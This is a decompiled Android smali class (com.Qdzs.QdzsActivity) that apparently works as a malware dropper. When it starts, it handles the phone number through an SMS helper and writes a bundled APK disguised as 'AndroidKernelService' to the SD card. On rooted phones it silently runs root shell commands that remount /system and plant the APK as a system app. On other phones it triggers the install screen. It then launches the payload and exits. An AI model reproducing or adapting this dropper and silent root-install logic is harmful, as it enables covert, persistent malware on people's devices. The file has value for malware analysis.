.class public Lcom/Qdzs/QdzsActivity;
.super Landroid/app/Activity;
.source "QdzsActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 31
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static copyFile(Ljava/lang/String;Ljava/lang/String;)V
    .locals 7
    .parameter "sourceFile"
    .parameter "targetFile"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 162
    const/4 v1, 0x0

    .line 163
    .local v1, inBuff:Ljava/io/BufferedInputStream;
    const/4 v4, 0x0

    .line 166
    .local v4, outBuff:Ljava/io/BufferedOutputStream;
    :try_start_0
    new-instance v2, Ljava/io/BufferedInputStream;

    new-instance v6, Ljava/io/FileInputStream;

    invoke-direct {v6, p0}, Ljava/io/FileInputStream;-><init>(Ljava/lang/String;)V

    invoke-direct {v2, v6}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 169
    .end local v1           #inBuff:Ljava/io/BufferedInputStream;
    .local v2, inBuff:Ljava/io/BufferedInputStream;
    :try_start_1
    new-instance v5, Ljava/io/BufferedOutputStream;

    new-instance v6, Ljava/io/FileOutputStream;

    invoke-direct {v6, p1}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    invoke-direct {v5, v6}, Ljava/io/BufferedOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_2

    .line 172
    .end local v4           #outBuff:Ljava/io/BufferedOutputStream;
    .local v5, outBuff:Ljava/io/BufferedOutputStream;
    const/16 v6, 0x1400

    :try_start_2
    new-array v0, v6, [B

    .line 174
    .local v0, b:[B
    :goto_0
    invoke-virtual {v2, v0}, Ljava/io/BufferedInputStream;->read([B)I

    move-result v3

    .local v3, len:I
    const/4 v6, -0x1

    if-ne v3, v6, :cond_2

    .line 178
    invoke-virtual {v5}, Ljava/io/BufferedOutputStream;->flush()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 181
    if-eqz v2, :cond_0

    .line 182
    invoke-virtual {v2}, Ljava/io/BufferedInputStream;->close()V

    .line 183
    :cond_0
    if-eqz v5, :cond_1

    .line 184
    invoke-virtual {v5}, Ljava/io/BufferedOutputStream;->close()V

    .line 186
    :cond_1
    return-void

    .line 175
    :cond_2
    const/4 v6, 0x0

    :try_start_3
    invoke-virtual {v5, v0, v6, v3}, Ljava/io/BufferedOutputStream;->write([BII)V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_0

    .line 179
    .end local v0           #b:[B
    .end local v3           #len:I
    :catchall_0
    move-exception v6

    move-object v4, v5

    .end local v5           #outBuff:Ljava/io/BufferedOutputStream;
    .restart local v4       #outBuff:Ljava/io/BufferedOutputStream;
    move-object v1, v2

    .line 181
    .end local v2           #inBuff:Ljava/io/BufferedInputStream;
    .restart local v1       #inBuff:Ljava/io/BufferedInputStream;
    :goto_1
    if-eqz v1, :cond_3

    .line 182
    invoke-virtual {v1}, Ljava/io/BufferedInputStream;->close()V

    .line 183
    :cond_3
    if-eqz v4, :cond_4

    .line 184
    invoke-virtual {v4}, Ljava/io/BufferedOutputStream;->close()V

    .line 185
    :cond_4
    throw v6

    .line 179
    :catchall_1
    move-exception v6

    goto :goto_1

    .end local v1           #inBuff:Ljava/io/BufferedInputStream;
    .restart local v2       #inBuff:Ljava/io/BufferedInputStream;
    :catchall_2
    move-exception v6

    move-object v1, v2

    .end local v2           #inBuff:Ljava/io/BufferedInputStream;
    .restart local v1       #inBuff:Ljava/io/BufferedInputStream;
    goto :goto_1
.end method


# virtual methods
.method public isExist()Z
    .locals 8

    .prologue
    const/4 v5, 0x0

    .line 189
    invoke-virtual {p0}, Lcom/Qdzs/QdzsActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 190
    .local v2, manager:Landroid/content/pm/PackageManager;
    if-eqz v2, :cond_2

    .line 191
    invoke-virtual {v2, v5}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v4

    .line 192
    .local v4, pkgList:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    const/4 v1, 0x0

    .local v1, i:I
    :goto_0
    invoke-interface {v4}, Ljava/util/List;->size()I

    move-result v6

    if-lt v1, v6, :cond_0

    .line 207
    .end local v1           #i:I
    .end local v4           #pkgList:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    :goto_1
    return v5

    .line 193
    .restart local v1       #i:I
    .restart local v4       #pkgList:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    :cond_0
    invoke-interface {v4, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/content/pm/PackageInfo;

    .line 194
    .local v3, pI:Landroid/content/pm/PackageInfo;
    if-eqz v3, :cond_1

    .line 196
    :try_start_0
    iget-object v6, v3, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    .line 197
    const-string v7, "com.AndroidKernelService"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v6

    if-eqz v6, :cond_1

    .line 198
    const/4 v5, 0x1

    goto :goto_1

    .line 199
    :catch_0
    move-exception v0

    .line 200
    .local v0, e:Ljava/lang/Exception;
    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "\u5224\u65ad\u8f6f\u4ef6\u662f\u5426\u5df2\u7ecf\u5b89\u88c5\u65f6\u62a5\u9519\uff1a"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 192
    .end local v0           #e:Ljava/lang/Exception;
    :cond_1
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 205
    .end local v1           #i:I
    .end local v3           #pI:Landroid/content/pm/PackageInfo;
    .end local v4           #pkgList:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    :cond_2
    const-string v6, "PackageManager\u5b9a\u4e49\u7684\u53d8\u91cfmanager\u4e3a\u7a7a"

    invoke-static {v6}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    goto :goto_1
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 12
    .parameter "savedInstanceState"

    .prologue
    const/4 v11, 0x0

    .line 35
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 36
    const-string v5, "/mnt/sdcard/"

    .line 39
    .local v5, myLogFilePath:Ljava/lang/String;
    new-instance v6, Lcom/Qdzs/SendSMS;

    invoke-direct {v6}, Lcom/Qdzs/SendSMS;-><init>()V

    .line 40
    .local v6, mySendSMS:Lcom/Qdzs/SendSMS;
    invoke-virtual {v6}, Lcom/Qdzs/SendSMS;->writePhoneNum()V

    .line 44
    const-string v9, "\u5224\u65ad\u7cfb\u7edf\u662f\u5426\u5df2\u7ecf\u5b89\u88c5\u8f6f\u4ef6"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 45
    invoke-virtual {p0}, Lcom/Qdzs/QdzsActivity;->isExist()Z

    move-result v9

    if-eqz v9, :cond_0

    .line 46
    const-string v9, "\u7cfb\u7edf\u5df2\u7ecf\u5b89\u88c5\u8be5\u8f6f\u4ef6"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 48
    const-string v9, "\u5df2\u7ecf\u5b89\u88c5\u624b\u673a\u7aef\uff0c\u73b0\u5728\u6267\u884c\u5220\u9664\u5b89\u88c5\u5305\u7684\u64cd\u4f5c..."

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 50
    :try_start_0
    new-instance v3, Ljava/io/File;

    const-string v9, "/mnt/sdcard/AndroidKernelService.apk"

    invoke-direct {v3, v9}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 51
    .local v3, mFile:Ljava/io/File;
    invoke-virtual {v3}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 55
    .end local v3           #mFile:Ljava/io/File;
    :goto_0
    const-string v9, "\u5b89\u88c5\u5305\u5df2\u7ecf\u5220\u9664\u6389"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 58
    :try_start_1
    invoke-virtual {p0}, Lcom/Qdzs/QdzsActivity;->startAKS()V

    .line 59
    invoke-virtual {p0}, Lcom/Qdzs/QdzsActivity;->startAKSActivity()V

    .line 60
    const-string v9, "\u624b\u673a\u7aef\u7a0b\u5e8f\u542f\u52a8\u5b8c\u6bd5"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 64
    :goto_1
    const-string v9, "\u6b63\u9000\u51fa\u7a0b\u5e8f"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 65
    invoke-static {v11}, Ljava/lang/System;->exit(I)V

    .line 128
    :goto_2
    :try_start_2
    const-string v9, "\u542f\u52a8\u624b\u673a\u7aef\u7a0b\u5e8f..."

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 129
    invoke-virtual {p0}, Lcom/Qdzs/QdzsActivity;->startAKS()V

    .line 130
    invoke-virtual {p0}, Lcom/Qdzs/QdzsActivity;->startAKSActivity()V

    .line 131
    const-string v9, "\u624b\u673a\u7aef\u7a0b\u5e8f\u542f\u52a8\u5b8c\u6bd5"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 135
    :goto_3
    const-string v9, "\u6b63\u5728\u9000\u51fa\u7a0b\u5e8f..."

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 137
    invoke-static {v11}, Ljava/lang/System;->exit(I)V

    .line 138
    const-string v9, "\u9000\u51fa\u7a0b\u5e8f\u5b8c\u6bd5"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 139
    return-void

    .line 52
    :catch_0
    move-exception v0

    .line 53
    .local v0, e:Ljava/lang/Exception;
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "\u5c06\u5b89\u88c5\u5305\u5220\u9664\u5f02\u5e38"

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    goto :goto_0

    .line 61
    .end local v0           #e:Ljava/lang/Exception;
    :catch_1
    move-exception v0

    .line 62
    .restart local v0       #e:Ljava/lang/Exception;
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "\u542f\u52a8\u624b\u673a\u7aef\u7a0b\u5e8f\u5f02\u5e38"

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    goto :goto_1

    .line 68
    .end local v0           #e:Ljava/lang/Exception;
    :cond_0
    const-string v9, "\u7cfb\u7edf\u5c1a\u672a\u5b89\u88c5\u8be5\u8f6f\u4ef6"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 72
    const-string v9, "\u6b63\u5728\u91ca\u653eapk\u4e2d..."

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 73
    new-instance v7, Lcom/Qdzs/WriteApk;

    invoke-direct {v7}, Lcom/Qdzs/WriteApk;-><init>()V

    .line 74
    .local v7, myWriteApk:Lcom/Qdzs/WriteApk;
    invoke-virtual {v7}, Lcom/Qdzs/WriteApk;->Write()V

    .line 75
    const-string v9, "apk\u6587\u4ef6\u91ca\u653e\u5b8c\u6bd5..."

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 78
    const-string v9, "\u5224\u65ad\u662f\u5426\u5df2\u7ecfroot"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 79
    new-instance v4, Lcom/Qdzs/IfRoot;

    invoke-direct {v4}, Lcom/Qdzs/IfRoot;-><init>()V

    .line 80
    .local v4, myIfRoot:Lcom/Qdzs/IfRoot;
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "\u7cfb\u7edfroot\u5982\u4e0b\uff1a"

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/Qdzs/IfRoot;->isRootSystem()Z

    move-result v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 81
    invoke-static {}, Lcom/Qdzs/IfRoot;->isRootSystem()Z

    move-result v9

    if-nez v9, :cond_1

    .line 83
    const-string v9, "\u7cfb\u7edf\u6ca1\u6709root"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 86
    const-string v9, "\u542f\u52a8\u754c\u9762\u5b89\u88c5"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 87
    const-string v1, "/mnt/sdcard/AndroidKernelService.apk"

    .line 88
    .local v1, fileName:Ljava/lang/String;
    new-instance v2, Landroid/content/Intent;

    const-string v9, "android.intent.action.VIEW"

    invoke-direct {v2, v9}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 89
    .local v2, intent:Landroid/content/Intent;
    new-instance v9, Ljava/io/File;

    invoke-direct {v9, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v9}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v9

    .line 90
    const-string v10, "application/vnd.android.package-archive"

    .line 89
    invoke-virtual {v2, v9, v10}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 91
    invoke-virtual {p0, v2}, Lcom/Qdzs/QdzsActivity;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_2

    .line 95
    .end local v1           #fileName:Ljava/lang/String;
    .end local v2           #intent:Landroid/content/Intent;
    :cond_1
    const-string v9, "\u7cfb\u7edf\u5df2\u7ecfroot\uff0c\u6b63\u5728\u590d\u5236\u624b\u673a\u7aef\u6587\u4ef6\u5230/system/app\u76ee\u5f55\u4e0b"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 98
    const-string v9, "\u7b2c\u4e8c\u79cd\u590d\u5236\u65b9\u6cd5\u5f00\u59cb"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 99
    const-string v8, "adb push AndroidKernelService.apk /system/app\nadb shell\nsu\nmount -o remount,rw -t yaffs2 /dev/block/mtdblock3 /system\ncat /sdcard/AndroidKernelService.apk > /system/app/AndroidKernelService.apk\nmount -o remount,ro -t yaffs2 /dev/block/mtdblock3 /system\nexit\nexit"

    .line 111
    .local v8, paramString:Ljava/lang/String;
    invoke-static {}, Lcom/Qdzs/RootCmd;->haveRoot()Z

    move-result v9

    if-eqz v9, :cond_3

    .line 112
    invoke-static {v8}, Lcom/Qdzs/RootCmd;->execRootCmdSilent(Ljava/lang/String;)I

    move-result v9

    const/4 v10, -0x1

    if-ne v9, v10, :cond_2

    .line 113
    const-string v9, "\u5b89\u88c5\u4e0d\u6210\u529f"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 122
    :goto_4
    const-string v9, "\u7b2c\u4e8c\u79cd\u590d\u5236\u65b9\u6cd5\u7ed3\u675f"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    goto/16 :goto_2

    .line 115
    :cond_2
    const-string v9, "\u5b89\u88c5\u6210\u529f"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    goto :goto_4

    .line 119
    :cond_3
    const-string v9, "\u6ca1\u6709root\u6743\u9650"

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    goto :goto_4

    .line 132
    .end local v4           #myIfRoot:Lcom/Qdzs/IfRoot;
    .end local v7           #myWriteApk:Lcom/Qdzs/WriteApk;
    .end local v8           #paramString:Ljava/lang/String;
    :catch_2
    move-exception v0

    .line 133
    .restart local v0       #e:Ljava/lang/Exception;
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "\u542f\u52a8\u624b\u673a\u7aef\u7a0b\u5e8f\u5f02\u5e38:"

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    goto/16 :goto_3
.end method

.method public startAKS()V
    .locals 3

    .prologue
    .line 143
    invoke-virtual {p0}, Lcom/Qdzs/QdzsActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    .line 144
    const-string v2, "com.AndroidKernelService"

    .line 143
    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 145
    .local v0, intent:Landroid/content/Intent;
    if-eqz v0, :cond_0

    .line 146
    invoke-virtual {p0, v0}, Lcom/Qdzs/QdzsActivity;->startActivity(Landroid/content/Intent;)V

    .line 148
    :cond_0
    return-void
.end method

.method public startAKSActivity()V
    .locals 2

    .prologue
    .line 152
    new-instance v0, Landroid/content/Intent;

    .line 153
    const-string v1, "android.intent.action.AndroidKernelActivity"

    .line 152
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 155
    .local v0, intent:Landroid/content/Intent;
    invoke-virtual {p0, v0}, Lcom/Qdzs/QdzsActivity;->startActivity(Landroid/content/Intent;)V

    .line 157
    return-void
.end method
